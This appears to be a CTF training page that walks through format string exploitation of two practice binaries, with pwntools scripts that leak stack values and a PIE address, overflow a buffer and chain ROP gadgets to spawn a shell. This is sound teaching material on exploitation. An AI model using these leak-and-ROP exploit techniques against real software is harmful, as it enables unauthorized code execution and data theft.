<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Format String Exploitation [train 2] | Security Training</title>
    <meta name="description" content="This is the 2nd challenge in the in the series. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.">
    <link href="/src/index.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <style>
        body { 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
        }
        .code-block {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        .gradient-text {
            background: linear-gradient(135deg, #f97316, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .toc-sidebar {
            position: fixed;
            top: 2rem;
            left: 1rem;
            max-height: calc(100vh - 4rem);
            overflow-y: auto;
            background: #1a1a1a;
            border: 1px solid #374151;
            border-radius: 0.75rem;
            padding: 1.5rem;
            margin-right: 0;
            width: 280px;
            flex-shrink: 0;
            z-index: 10;
        }
        .toc-title {
            font-size: 0.875rem;
            font-weight: 600;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 1rem;
            border-bottom: 1px solid #374151;
            padding-bottom: 0.5rem;
        }
        .toc-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .toc-sublist {
            list-style: none;
            padding-left: 0.5rem;
            margin-top: 0.25rem;
        }
        .toc-item {
            margin: 0.25rem 0;
        }
        .toc-level-2 {
            padding-left: 0.25rem;
        }
        .toc-level-3 {
            padding-left: 0.75rem;
        }
        .toc-level-4 {
            padding-left: 1.25rem;
        }
        .toc-link {
            display: block;
            color: #9ca3af;
            text-decoration: none;
            font-size: 0.875rem;
            line-height: 1.5;
            padding: 0.25rem 0;
            border-radius: 0.25rem;
            transition: all 0.2s;
        }
        .toc-link:hover {
            color: #60a5fa;
            background: #1f2937;
            padding-left: 0.5rem;
        }
        @media (max-width: 1024px) {
            .toc-sidebar {
                display: none;
            }
        }
        .prose h1 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 2.5rem;
            font-weight: 800;
            margin-top: 3rem;
            margin-bottom: 1.5rem;
        }
        .prose h2 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 2rem;
            font-weight: 700;
            margin-top: 3rem;
            margin-bottom: 1rem;
            border-bottom: 2px solid #374151;
            padding-bottom: 0.5rem;
        }
        .prose h3 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 1.5rem;
            font-weight: 600;
            margin-top: 2rem;
            margin-bottom: 0.75rem;
        }
        .prose h4 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 1.25rem;
            font-weight: 600;
            margin-top: 1.5rem;
            margin-bottom: 0.5rem;
        }
        .prose p {
            margin-bottom: 1.5rem;
            line-height: 1.7;
            color: #d1d5db;
        }
        .prose strong {
            color: #f3f4f6;
            font-weight: 600;
        }
        .prose code {
            background: #1e1e1e;
            color: #fbbf24;
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        .prose pre {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1.5rem;
            overflow-x: auto;
            margin: 2rem 0;
        }
        .prose pre code {
            background: transparent;
            color: #e5e7eb;
            padding: 0;
            border-radius: 0;
        }
        .prose blockquote {
          background:rgb(93, 45, 26);
          color:rgb(255, 255, 255);
          border-left: 4px solid #ff8c00;
          padding: 1rem 1.25rem;
          margin: 1.25rem 0;
          border-radius: calc(var(--radius) - 2px);
        }

        .prose ul, .prose ol {
            list-style-color: #ff8c00;
            list-style-type: disc;
            list-style-position: outside;
            margin: 1.5rem 0;
            padding-left: 2rem;
        }
        .prose li {
            margin: 0.5rem 0;
            color: #d1d5db;
        }
        .prose li::marker {
            color: #ff8c00 !important;
        }
        .prose ol li {
            list-style-type: decimal;
        }
            margin: 2rem 0;
            background: #1e1e1e;
            border-radius: 8px;
            overflow: hidden;
        }
        .prose th, .prose td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        .prose th {
            background: #2d2d2d;
            color: #f3f4f6;
            font-weight: 600;
        }
        .prose img {
            border-radius: 8px;
            margin: 2rem 0;
            max-width: 100%;
        }
        .prose hr {
            border: none;
            height: 2px;
            background: linear-gradient(90deg, transparent, #374151, transparent);
            margin: 3rem 0;
        }
        .prose a { color: rgb(3, 203, 146); text-decoration: underline; }

    </style>
</head>
<body class="min-h-screen">
    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
        <header class="mb-12">
            <a href="/training" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">‚Üê Back</a>
            <h1 class="text-4xl md:text-5xl font-bold mb-4">
                <span class="gradient-text">Format String Exploitation [train 2]</span>
            </h1>
            <div class="mb-8"><img src="/trainings/Format-String-Exploitation-[train-2]/featured.png" alt="Format String Exploitation [train 2] cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
                <span class="bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300 px-2.5 py-0.5 rounded-full text-xs font-medium">Beginner</span>
                
                <div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">pwn</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">training</span></div>
            </div>
        </header>

        <div class="flex flex-col lg:flex-row justify-start gap-6">
            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><li class="toc-item toc-level-1"><a href="#challenge-1" class="toc-link">Challenge 1:</a></li><li class="toc-item toc-level-1"><a href="#solution" class="toc-link">Solution:</a></li><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#mitigations" class="toc-link">Mitigations:</a></li><li class="toc-item toc-level-2"><a href="#code-walkthrough" class="toc-link">Code walkthrough:</a></li><li class="toc-item toc-level-2"><a href="#vulnerability" class="toc-link">Vulnerability:</a></li><li class="toc-item toc-level-2"><a href="#printf" class="toc-link">printf:</a></li><li class="toc-item toc-level-2"><a href="#exploitation" class="toc-link">Exploitation:</a></li></ul><li class="toc-item toc-level-1"><a href="#set-up-pwntools-for-the-correct-architecture" class="toc-link">Set up pwntools for the correct architecture</a></li><li class="toc-item toc-level-1"><a href="#exploit-goes-here" class="toc-link">EXPLOIT GOES HERE</a></li><li class="toc-item toc-level-1"><a href="#challenge-2" class="toc-link">Challenge 2:</a></li><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#mitigations" class="toc-link">Mitigations:</a></li><li class="toc-item toc-level-2"><a href="#code-walkthrough" class="toc-link">Code walkthrough:</a></li><li class="toc-item toc-level-2"><a href="#rop" class="toc-link">ROP:</a></li></ul><li class="toc-item toc-level-1"><a href="#set-up-pwntools-for-the-correct-architecture" class="toc-link">Set up pwntools for the correct architecture</a></li><li class="toc-item toc-level-1"><a href="#exploit-goes-here" class="toc-link">EXPLOIT GOES HERE</a></li></ul></nav></aside>
            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
<p>This is the 2nd challenge in the in the series. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.</p>
<!--more-->
<h1 id="challenge-1">Challenge 1:</h1>
<p>You can download the binary and the source down below.</p>
<p><a href="/images/pwn-train2/flagleak">vuln binary</a> and <br />
<a href="/images/pwn-train2/flagleak.c">vuln c code</a></p>
<h1 id="solution">Solution:</h1>
<h2 id="mitigations">Mitigations:</h2>
<p>Lets do the usual drill of checking the mitigations of this binary. </p>
<pre><code class="bash language-bash">checksec --file ./flagleak
</code></pre>
<p><img src="/images/pwn-train2/pwntrain1.png" alt="" /></p>
<p>RELRO:</p>
<ul>
<li>Partial RELRO - In the attackers point of view, the GOT (Global Offset Table) is readable and writeable.</li>
</ul>
<p>CANARY:</p>
<ul>
<li>There is no canary so we can do a buffer overflow.</li>
</ul>
<p>No eXecute:</p>
<ul>
<li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
</ul>
<p>PIE:</p>
<ul>
<li>No PIE: We know the address of the binary at runtime, Since the binary is not position independent.</li>
</ul>
<h2 id="code-walkthrough">Code walkthrough:</h2>
<p>As said in previous training you can dig in deep into the assembly but to make things simpler we are given the source code. (in most CTF / Real life applications it'll be helpful if you know assembly).</p>
<p><img src="/images/pwn-train2/pwntrain2.png" alt="" /></p>
<p>In the main function there is an obvious buffer overflow. Since there is a buffer of size 0x60 but the input is reading 0x60+8+16 (lmao author made is quite obvious). Ok we know the basic buffer overflow pattern right? </p>
<p><img src="/images/pwn-train2/pwntrain3.png" alt="" /></p>
<p>I hope you can come to the <code>print_flag</code> function by your own. (If you could'nt, no probs go <a href="https://pranavkrish04.github.io/pwn-training/2021/05/09/simple-ret2shellcode-training1.html">here</a> ). Let us now see what is there in the print_flag function.</p>
<p><img src="/images/pwn-train2/pwntrain4.png" alt="" /></p>
<p>It is reading a file called flag.txt. If you dont have the file in your current directory it will give you an error. so create a file with a random value. In this task our main goal is to get the value of the flag. A flag is basically a valuable object in games called ctfs likewise in security contests these flags give you points. Wait does it mean you can't get a shell in this challenge :( ? Umm‚Ä¶ You can spawn a shell in this challenge, but in this module we will only try out format string exploitation. If you are too keen to know, then check out what libc leak is. Dont worry we will see them in the later parts of this training. </p>
<h2 id="vulnerability">Vulnerability:</h2>
<p>Before going into the vuln lets see how printf works. </p>
<h2 id="printf">printf:</h2>
<p>printf is a function in the glibc library. It basically has 2 parts, a format and an argument.</p>
<pre><code class="c language-c">printf("text here and %x %p %s ", a,b,c)
</code></pre>
<p>So in the first field we fill it with text and format specifiers to print the values in the corresponding second field (variables). The different format specifiers like %x %p %s denote the datatype of the variable; like hex, pointer, string respectively.</p>
<h2 id="exploitation">Exploitation:</h2>
<p>So what if we are able to control the first field. Imagine being able to read more values from 2nd field, more than the available arguments ? Will the program crash ? will it send some garbage data ?  ü§î </p>
<p>points to note: </p>
<ul>
<li>The arguments are stored in the stack.</li>
<li>printf will take values from the stack.</li>
</ul>
<p>So, the extra format specifiers we specified will continue to take the values stored in the stack. Lets do it live. [I am using pwntools template. to make a template go to terminal and type <code>pwn template &gt; xpl.py</code> ]. Now go to vim and continue writing your exploit from the buffer overflow to the print_flag function. (if you are lazy you can copy the script down below :( )</p>
<pre><code class="py language-py">#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './flagleak'
elf = ELF("flagleak")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b* main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start() #make a connection to the flagleak binary

p.recvline() # recv the line given by the binary
p.send(b"A"*(0x60+8) + p64(0x401016)  +  p64(elf.sym['print_flag']) ) # send a bufferoverflow to the binary to redirect code excecution to print_flag

p.interactive()
</code></pre>
<p>If you note there, I have added a ret instruction inbetween the print_flag function and rbp. This is to ensure stack alignment issues dont happen.</p>
<p>Ok now set a break point right at the printf function in the print_flag function. To do that change the main to the address of printf in the gdbscript. Running your script in vim is very easy. </p>
<pre><code class="vim language-vim">ESC, :w | !./% GDB NOASLR
</code></pre>
<p>In the above command we are writing the script with w, running a bash command with ! and excecuting the file ./%. % -&gt; represents the current file. GDB NOASLR -&gt; attachs gdb with ASLR disabled.</p>
<pre><code class="py language-py">p = start()
p.recvline()
p.send(b"A"*(0x60+8) + p64(0x401016)  +  p64(elf.sym['print_flag']) )
p.recvline()
p.sendline("%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-")
p.interactive()
</code></pre>
<p>After playing a little bit with gdb and format strings you will know that most of the stuff thats leaked is from the stack. Now you can also inspect the stack in gdb pwndbg with <code>stack 20</code>. Wait a minute!! Do you see there is an address in stack that contains all the contents of our flag file ? Yes when you read and store a file, its contents will be stored on the stack.</p>
<p><img src="/images/pwn-train2/pwntrain5.png" alt="" /></p>
<p>Also in the leaked values we can see that our flag address is also leaked.</p>
<p><img src="/images/pwn-train2/pwntrain6.png" alt="" /></p>
<p>Now if you came this far you might have come across the format specifier %s -&gt; this will get the contents stored in an address. So what if instead of printing the address, lets print the string pointed by the address. (So should we change all the p to s ?). hmm You do it only if all the values on the stack are valid address that points to some string. In this case its better to just count which offset our string is and then print it. </p>
<p>Counting the offset we see that our string is in 12th position. So we can just print that position with a trick. <code>%{offset}$p</code> will print the the value in stack at that offset. So lets try it.</p>
<p><img src="/images/pwn-train2/pwntrain7.png" alt="" /></p>
<p>YAY we managed to print it out, now finally we just have to print the contents of the address so change the p to s now. We managed to print something on the stack. (well done)</p>
<p><img src="/images/pwn-train2/pwntrain8.png" alt="" /></p>
<h1 id="challenge-2">Challenge 2:</h1>
<p>Lets take this one step further and make the an exploit for another harder* binary.</p>
<p><a href="/images/pwn-train2/ret2win_pie">vuln binary</a> and <br />
<a href="/images/pwn-train2/ret2win_pie.c">vuln c code</a></p>
<h2 id="mitigations-1">Mitigations:</h2>
<p><img src="/images/pwn-train2/pwntrain9.png" alt="" /></p>
<p>Exactly the same mitigations except PIE.<br />
PIE ENABLED: this time we cant jump directly to another piece of code. The base address of binary will be randomised.<br />
Go ahead and give this a try.</p>
<h2 id="code-walkthrough-1">Code walkthrough:</h2>
<p><img src="/images/pwn-train2/pwntrain10.png" alt="" /></p>
<p>In the main function we can see that a buffer variable <code>shot</code> is initialised and it is being used to get an input and later printed on to the screen. After that a gets function is used. We already know that gets function does not care about the size of the buffer, it will read until a newline. lets spam so %p in the <code>shot</code> variable and see what out put we are getting.</p>
<pre><code class="py language-py">p = start()
p.recvline()
p.sendline("%p "*(0x60))
p.interactive()
</code></pre>
<p>Do you see a lot of garbage ? Along with that do you see some amazing addresses ?</p>
<p><img src="/images/pwn-train2/pwntrain11.png" alt="" /></p>
<p>Exactly, the address <code>0x0000555555555222</code> is the start of main. So we have overcome the problem of PIE, since we know a address in the binary, we can calculate the relative offsets of other functions as well. Lets see what helper function we are provided with now.</p>
<h2 id="rop">ROP:</h2>
<p><img src="/images/pwn-train2/pwntrain12.png" alt="" /></p>
<p>A win function: this will call execve("/bin/sh"), its a ROP challenge and I am pretty sure you know how to do it. There is a small catch here. We have to calculate the relative offset of the addresses since PIE is enabled, so manually calculate the distance of the gadgets and the win function.</p>
<pre><code class="py language-py">p = start()

p.recvline()
p.sendline("%p "*(27))
l = p.recvline().split()

leaked_main = int(l[-1], 16)
win_func = leaked_main - (0x555555555222-0x5555555551c8)
binary_start = leaked_main - (0x555555555222-0x555555554000)

log.info("Leaked main address: " + str(l[-1]))
log.info("win function: "+ str(win_func))
log.info("Binary Start: "+ str(leaked_main - (0x555555555222-0x555555554000)))

p.interactive()
</code></pre>
<p>Here, I found out that the 27th position, the address of main is printed so I put all the leaked stuff into a list (You can just strip it and store the main address value too). Next I manaually subtract the offset and add it to get the address from the leaked value. Also just to be sure everything is correct, I log all the info I get and verify them in gdb.</p>
<p>Now its simple, just call the win function with its argument set to <code>0xdeadbeefcafebabe</code> (RDI).</p>
<p>Full Exploit: </p>
<pre><code class="py language-py">#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './ret2win_pie'
elf = ELF("ret2win_pie")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b* main+67
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.recvline()
p.sendline("%p "*(27))
l = p.recvline().split()

leaked_main = int(l[-1], 16)
win_func = leaked_main - (0x555555555222-0x5555555551c8)
binary_start = leaked_main - (0x555555555222-0x555555554000)

log.info("Leaked main address: " + str(l[-1]))
log.info("win function: "+ str(win_func))
log.info("Binary Start: "+ str(leaked_main - (0x555555555222-0x555555554000)))

p.sendline(b"A"*0x60 + b"B"*8 + p64(binary_start+0x00000000000012eb) + p64(0xdeadbeefcafebabe) + p64(win_func))

p.interactive()     
</code></pre>
<p>Hope you guys enjoyed the pwn training 2 more amazing challenges are yet to come !! Happy hacking.</p>
            </article>
        </div>

        <!-- Navigation -->
        <nav class="mt-16 pt-8 border-t border-gray-700">
            <div class="flex justify-between items-center">
                <div class="flex-1">
                    <a href="/trainings/Return-to-Shellcode-[train-1].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
                        </svg>
                        <div class="text-left">
                            <div class="text-xs text-gray-400">Previous</div>
                            <div class="font-medium">Return to Shellcode [train 1]</div>
                        </div>
                    </a>
                </div>
                <div class="flex-1 text-center">
                    <a href="/training" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Trainings</a>
                </div>
                <div class="flex-1 text-right">
                    <a href="/trainings/Ret-to-libc-[train-3].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <div class="text-right">
                            <div class="text-xs text-gray-400">Next</div>
                            <div class="font-medium">Ret-to-libc [train 3]</div>
                        </div>
                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </nav>
    </div>
<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
</body>
</html>